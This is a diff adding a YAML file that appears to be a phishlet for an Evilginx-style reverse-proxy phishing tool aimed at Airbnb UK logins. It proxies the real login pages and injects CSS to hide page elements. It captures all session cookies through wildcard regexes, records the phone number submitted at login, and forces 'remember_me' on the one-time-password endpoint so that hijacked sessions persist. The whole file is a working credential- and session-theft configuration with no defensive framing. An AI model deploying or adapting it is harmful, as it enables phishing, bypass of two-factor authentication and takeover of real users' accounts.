@@ -1,0 +1,43 @@
+author: '@me'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.co.uk', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: 'www', domain: 'airbnb.co.uk', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.airbnb.co.uk', orig_sub: 'www', domain: 'airbnb.co.uk', search: '</head>', replace: '<style> ._1agy6r6e {display:none;} ._p03egf:nth-of-type(2), ._p03egf:nth-of-type(3), ._p03egf:nth-of-type(4), ._p03egf:nth-of-type(4) + form { display: none !important;}  </style></head>', mimes: ['text/html', 'application/json', 'application/xhtml+xml', 'application/xml']}
+auth_tokens:
+  - domain: '.airbnb.co.uk'
+    keys: ['.*,regexp']
+  - domain: 'www.airbnb.co.uk'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'phoneNumber'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'phone'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/api/v2/phone_one_time_passwords'
+    search:
+      - {key: 'currency', search: '.*'}
+      - {key: 'key', search: '.*'}
+      - {key: 'from', search: '.*'}
+      - {key: 'locale', search: '.*'}
+      - {key: 'otpMethod', search: '.*'}
+      - {key: 'phoneNumber', search: '.*'}
+      - {key: 'workFlow', search: '.*'}
+    force:
+      - {key: 'remember_me', value: 'true'}
+    type: 'post'
+auth_urls:
+  - '/'
+login:
+  domain: 'www.airbnb.co.uk'
+  path: '/login'
+
+
+
